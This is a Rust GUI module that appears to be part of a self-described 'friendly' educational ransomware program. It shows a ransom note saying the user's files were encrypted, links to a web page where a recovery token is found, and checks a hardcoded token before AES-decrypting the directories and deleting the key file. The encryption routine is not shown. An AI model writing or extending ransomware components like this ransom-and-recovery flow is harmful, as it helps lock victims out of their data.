pub mod app {
    use crate::cyp::cyp::*;
    use std::path::Path;
    use std::fs;

    use druid::{ Widget, Env,
    widget::{ TextBox, Flex, Align, Button, Label, LineBreaking::WordWrap },
        Data, Lens, WidgetExt,  Insets};
    use webbrowser;
    use std::thread;

    #[derive(Clone, Data, Lens)]
    pub struct AppState {
        pub input_text: String,
        pub link_clicked: bool,
        pub token:bool
    }

    pub fn ui_builder() -> impl Widget<AppState> {

        let long_text = r#"
            Hello there
            It appears you clicked on a weird binary file.
            Your private data was hence cyphered.
            That means you can no longer access them for the moment.
            You can go ahead and check your documents files for instance.
            Luckily for you this time, I am a friendly program.
            To recover your data, you must find out your token.
            I hope you will learn about the dangers of opening suspicious files
            during your search.
            Beware that the next time you might not get as lucky."#;

        let header = Label::new(long_text)
            .with_text_size(16.0)
            .with_line_break_mode(WordWrap);

        let link_button = Button::new("get the token here!")
            .on_click(|_, data: &mut AppState, _| {
                    data.link_clicked = true;
                    let _browser = thread::spawn(|| 
                            webbrowser::open("https://gaspardcode.github.io")
                            .is_ok());
                    });
        let text_input = TextBox::new()
            .with_placeholder("Input the token here")
            .expand_width()
            .lens(AppState::input_text);

        let valid_button = Button::new("Submit your answer")
            .on_click(|_, data: &mut AppState, _| {
                    if data.input_text == String::from("TOKEN")
                    {
                        println!("Congrats, you will soon recover your data, Bye");
                        data.token = true;
                        let _decypher = thread::spawn(|| {
                            let mut ciph = load_cipher_from_file(FILE_KEY)
                            .unwrap();
                            let _ = 
                            aes_dirs(Path::new(&ROOT), aes_dec, &mut ciph);
                            fs::remove_file(FILE_KEY).unwrap();
                        });
                    }
                    else
                    {
                        println!("Wrong token");
                    }
                    });

        let info_token = Label::dynamic(|data: &AppState, _:&Env|
                if data.token {
                    format!("Congrats, you will soon recover your data")
                }
                else {
                    format!("Wrong token")
                });

        let content = Flex::column()
            .with_child(text_input)
            .with_spacer(10.0)
            .with_child(link_button)
            .with_spacer(10.0)
            .with_child(valid_button)
            .with_spacer(10.0)
            .with_child(info_token);

        let layout = Flex::column()
            .with_child(header)
            .with_spacer(10.0)
            .with_child(content)
            .padding(Insets::uniform(10.0));

        Align::centered(layout)
    }
}
